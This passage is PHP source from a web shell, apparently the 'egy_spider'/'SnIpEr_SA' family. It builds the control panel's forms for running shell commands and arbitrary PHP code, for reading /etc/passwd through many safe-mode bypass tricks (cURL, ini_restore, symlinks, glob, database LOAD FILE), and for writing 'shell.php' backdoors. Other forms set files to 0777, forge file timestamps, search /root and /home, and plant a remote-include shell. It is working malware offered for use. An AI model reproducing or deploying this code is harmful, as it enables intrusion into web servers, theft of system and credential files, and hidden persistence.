 } 

echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";

function div_title($title, $id)
{
  return '<a style="cursor: pointer;" onClick="change_divst(\''.$id.'\');">'.$title.'</a>';
}
function div($id)
 { 
 if(isset($_COOKIE[$id]) && ($_COOKIE[$id]==0)) return '<div id="'.$id.'" style="display: none;">'; 
 $divid=array('id5','id6','id8','id9','id10','id11','id16','id24','id25','id26','id27','id28','id29','id33','id34','id35','id37','id38','id39');
 if(empty($_COOKIE[$id]) && @in_array($id,$divid)) return '<div id="'.$id.'" style="display: none;">'; 
 return '<div id="'.$id.'">';
 }
 
if(!$safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'</div>'.$table_end1.$fe;







echo $fs.$table_up1.div_title($lang[$language.'_text210'],'id20').$table_up2.div('id20').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','zend',85,(!empty($_POST['zend'])?($_POST['zend']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'zend').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

{
echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;
echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'</div>'.$table_end1.$fe;
}

if($unix && @function_exists('touch')){
echo $fs.$table_up1.div_title($lang[$language.'_text128'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','file_name',40,(!empty($_POST['file_name'])?($_POST['file_name']):($_SERVER["SCRIPT_FILENAME"])))
.ws(4)."<b>".$lang[$language.'_text26'].ws(2).$lang[$language.'_text59'].$arrow."</b>"
.ws(2).in('text','file_name_r',40,(!empty($_POST['file_name_r'])?($_POST['file_name_r']):(""))));
echo sr(15,"<b> or set  Day".$arrow."</b>",
'
<select name="day" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select>'
.ws(4)."<b>Month".$arrow."</b>"
.'
<select name="month" size="1">
<option value="January">January</option>
<option value="February">February</option>
<option value="March">March</option>
<option value="April">April</option>
<option value="May">May</option>
<option value="June">June</option>
<option value="July">July</option>
<option value="August">August</option>
<option value="September">September</option>
<option value="October">October</option>
<option value="November">November</option>
<option value="December">December</option>
</select>'
.ws(4)."<b>Year".$arrow."</b>"
.'
<select name="year" size="1">
<option value="1998">1998</option>
<option value="1999">1999</option>
<option value="2000">2000</option>
<option value="2001">2001</option>
<option value="2002">2002</option>
<option value="2003">2003</option>
<option value="2004">2004</option>
<option value="2005">2005</option>
<option value="2006">2006</option>
<option value="2006">2007</option>
<option value="2006">2008</option>
<option value="2006">2009</option>
<option value="2006">2010</option>
</select>'
.ws(4)."<b>Hour".$arrow."</b>"
.'
<select name="chasi" size="1">
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
</select>'
.ws(4)."<b>Minute".$arrow."</b>"
.'
<select name="minutes" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
</select>'
.ws(4)."<b>Second".$arrow."</b>"
.'
<select name="second" size="1">
<option value="01">1</option>
<option value="02">2</option>
<option value="03">3</option>
<option value="04">4</option>
<option value="05">5</option>
<option value="06">6</option>
<option value="07">7</option>
<option value="08">8</option>
<option value="09">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
<option value="32">32</option>
<option value="33">33</option>
<option value="34">34</option>
<option value="35">35</option>
<option value="36">36</option>
<option value="37">37</option>
<option value="38">38</option>
<option value="39">39</option>
<option value="40">40</option>
<option value="41">41</option>
<option value="42">42</option>
<option value="43">43</option>
<option value="44">44</option>
<option value="45">45</option>
<option value="46">46</option>
<option value="47">47</option>
<option value="48">48</option>
<option value="49">49</option>
<option value="50">50</option>
<option value="51">51</option>
<option value="52">52</option>
<option value="53">53</option>
<option value="54">54</option>
<option value="55">55</option>
<option value="56">56</option>
<option value="57">57</option>
<option value="58">58</option>
<option value="59">59</option>
</select>'
.in('hidden','cmd',0,'touch')
.in('hidden','dir',0,$dir)
.ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}

$select='';
if(@function_exists('chmod')){$select .= "<option value=mod>CHMOD</option>";}
if(@function_exists('chown')){$select .= "<option value=own>CHOWN</option>";}
if(@function_exists('chgrp')){$select .= "<option value=grp>CHGRP</option>";}
if($unix && $select){
echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id6').$table_up2.div('id6').$ts;
echo @sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','param1',55,(($_POST['param1'])?($_POST['param1']):($_SERVER["SCRIPT_FILENAME"]))).ws(2)."<b>".$lang[$language.'_text68'].$arrow."</b>"."<select name=what>".$select."</select>".ws(4).in('text','param2 title="'.$lang[$language.'_text71'].'"',10,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}

if(!$safe_mode){
$aliases2 = '';
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id5555').$table_up2.div('id5555').$ts;
echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id50').$table_up2.div('id50').$ts;
echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;$tempdir )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;

if(!$safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id9').$table_up2.div('id9').$ts;
echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;$tempdir )");
echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id800').$table_up2.$font;
echo "<div align=center>".div('id800')."<textarea name=php_eval cols=100 rows=10>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("//unlink(\"egy_spider.php\");\r\n//readfile(\"/etc/passwd\");\r\n//file_get_content(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</div></div></font>";
echo $table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text200'],'id520').$table_up2.div('id520').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','snn',85,'/etc/passwd').in('hidden','cmd',0,'copy').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text300'],'id500').$table_up2.div('id500').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','SnIpEr_SA',85,'/etc/passwd').in('hidden','cmd',0,'cURL').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text203'],'id510').$table_up2.div('id510').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','ini_restore',85,'/etc/passwd').in('hidden','cmd',0,'ini_restore').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text224'],'id800').$table_up2.div('id800').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>","<select size=\"1\" name=\"plugin\"><option value=\"plugin\">/etc/passwd</option></option></select>".in('hidden','cmd',0,'plugin').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text220'],'id900').$table_up2.div('id900').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','sym1p2',50,(!empty($_POST['sym1p2'])?($_POST['sym1p']):("/../../../"))).in('text','sym1p',50,(!empty($_POST['sym1p'])?($_POST['sym1p']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'sym1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text222'],'id980').$table_up2.div('id980').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'sym2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

{
echo $fs.$table_up1.div_title($lang[$language.'_text204'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text205'].$arrow."</b>",in('text','log',96,(!empty($_POST['log'])?($_POST['log']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'Paralyzing been planted and you can usefilename.php?ss=http://shell.txt?').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text207'],'id801').$table_up2.div('id801').$ts;
echo sr(15,"<b>".$lang[$language.'_text206'].$arrow."</b>",in('text','glob',85,'/etc/').in('hidden','cmd',0,'glob').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text209'],'id5505').$table_up2.div('id5505').$ts;
echo sr(15,"<b>".$lang[$language.'_text206'].$arrow."</b>",in('text','root',85,'/etc/').in('hidden','cmd',0,'root').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}



echo $fs.$table_up1.div_title($lang[$language.'_text151'],'id1221').$table_up2.div('id1221').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test_5_2_6',85,(!empty($_POST['test_5_2_6'])?($_POST['test_5_2_6']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test_5_2_6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text161'],'id12211').$table_up2.div('id12211').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_5_2_6',85,(!empty($_POST['test2_5_2_6'])?($_POST['test2_5_2_6']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2_5_2_6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;





echo $fs.$table_up1.div_title($lang[$language.'_text162'],'id9820').$table_up2.div('id9820').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'test_5_2_4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;


echo $fs.$table_up1.div_title($lang[$language.'_text163'],'id9820').$table_up2.div('id9820').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'egy_perl').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;


{
echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id12').$table_up2.div('id12').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}




{
echo $fs.$table_up1.div_title($lang[$language.'_text144'],'id40').$table_up2.div('id40').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test19_md',15,(!empty($_POST['test19_md'])?($_POST['test19_md']):("mysqli"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test19_ml',15,(!empty($_POST['test19_ml'])?($_POST['test19_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text39'].$arrow."</b>".in('text','test19_mp',15,(!empty($_POST['test19_mp'])?($_POST['test19_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test19_port',15,(!empty($_POST['test19_port'])?($_POST['test19_port']):("3306"))));
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test19_file',96,(!empty($_POST['test19_file'])?($_POST['test19_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test19').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id14').$table_up2.div('id14').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}


{
echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id13').$table_up2.div('id13').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id21').$table_up2.div('id21').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}


{
echo $fs.$table_up1.div_title($lang[$language.'_text170'],'id2221').$table_up2.div('id2221').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','egy_4_2_0',96,(!empty($_POST['egy_4_2_0'])?($_POST['egy_4_2_0']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'egy_4_2_0').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}



{
echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id22').$table_up2.div('id22').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST['test8_file1']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));
echo sr(15,"<b>".$lang[$language.'_text117'].ws(2).$lang[$language.'_text60'].$arrow."</b>",in('text','test8_file2',96,(!empty($_POST['test8_file2'])?($_POST['test8_file2']):($dir))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text120'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test9_file',96,(!empty($_POST['test9_file'])?($_POST['test9_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test9').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text121'],'id24').$table_up2.div('id24').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test10_file',96,(!empty($_POST['test10_file'])?($_POST['test10_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test10').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text122'],'id19').$table_up2.div('id19').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',96,(!empty($_POST['test_global'])?($_POST['test_global']):($dir))).in('hidden','cmd',0,'safe_dir').in('hidden','glob',0,'glob').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
$select_n_rlph = "<select name='n_rlph'><option value=1>[ 1 ] (<<0,01 sec)</option><option value=2>[ 2 ] (<0,01 sec)</option>".
"<option value=3 selected>[ 3 ] (<1 sec (default))</option>".
"<option value=4>[ 4 ] (<10 sec)</option><option value=5>[ 5 ] (>100 sec (danger))</option><option value=6>[ 6 ] (>>100 sec (danger))</option></select>";
echo $fs.$table_up1.div_title($lang[$language.'_text145'],'id41').$table_up2.div('id41').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',30,(!empty($_POST['dir_rlph'])?($_POST['dir_rlph']):($dir))).ws(2).'<b>'.$lang[$language.'_text55'].'</b>'.ws(2).in('text','end_rlph',6,(!empty($_POST['end_rlph'])?($_POST['end_rlph']):('.php'))).ws(2).in('hidden','cmd',0,'safe_dir').ws(2).'<b>'.$lang[$language.'_text146'].'</b>'.ws(2).$select_n_rlph.ws(2).in('hidden','realpath',0,'realpath').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text130'],'id25').$table_up2.div('id25').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test11_file',96,(!empty($_POST['test11_file'])?($_POST['test11_file']):($tempdir.'test.zip'))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test11').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text123'],'id26').$table_up2.div('id26').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test12_file',96,(!empty($_POST['test12_file'])?($_POST['test12_file']):($tempdir.'test.bzip'))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test12').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text124'],'id27').$table_up3.div('id27').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test13_file2',96,(!empty($_POST['test13_file2'])?($_POST['test13_file2']):($dir."shell.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test13_file1',96,(!empty($_POST['test13_file1'])?($_POST['test13_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text126'],'id28').$table_up2.div('id28').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test14_file2',96,(!empty($_POST['test14_file2'])?($_POST['test14_file2']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test14'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test14_file1',96,(!empty($_POST['test14_file1'])?($_POST['test14_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text133'],'id39').$table_up2.div('id39').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test18_file2',96,(!empty($_POST['test18_file2'])?($_POST['test18_file2']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test18'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test18_file1',96,(!empty($_POST['test18_file1'])?($_POST['test18_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text127'],'id29').$table_up2.div('id29').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test15_file2',96,(!empty($_POST['test15_file2'])?($_POST['test15_file2']):($dir."shell.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15'));
echo sr(15,"<b>".$lang[$language.'_text125'].$arrow."</b>",in('text','test15_file1',96,(!empty($_POST['test15_file1'])?($_POST['test15_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $fs.$table_up1.div_title($lang[$language.'_text129'],'id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test16_file',96,(!empty($_POST['test16_file'])?($_POST['test16_file']):($dir."test.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test16').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;  
}

{
echo $table_up1.div_title($lang[$language.'_text131'],'id17').$table_up2.div('id17').$ts;
echo "<tr><td valign=top width=70%>".$ts;
echo sr(20,"<b>".$lang[$language.'_text30'].$arrow."</b>",$fs.in('text','test17_file',60,(!empty($_POST['test17_file'])?($_POST['test17_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_1').in('submit','submit',0,$lang[$language.'_text136']).$fe);
echo $te."</td><td valign=top width=30%>".$ts;
echo sr(0,"",$fs.in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_2').in('submit','submit',0,$lang[$language.'_butt8']).$fe);
echo $te."</td></tr>";
echo $te.'</div>'.$table_end1;  
}

{
echo $table_up1.div_title($lang[$language.'_text132'],'id18').$table_up2.div('id18').$ts;
echo "<tr><td valign=top width=70%>".$ts;
echo sr(20,"<b>".$lang[$language.'_text4'].$arrow."</b>",$fs.in('text','test17_file',60,(!empty($_POST['test17_file'])?($_POST['test17_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_1').in('submit','submit',0,$lang[$language.'_text136']).$fe);
echo $te."</td><td valign=top width=30%>".$ts;
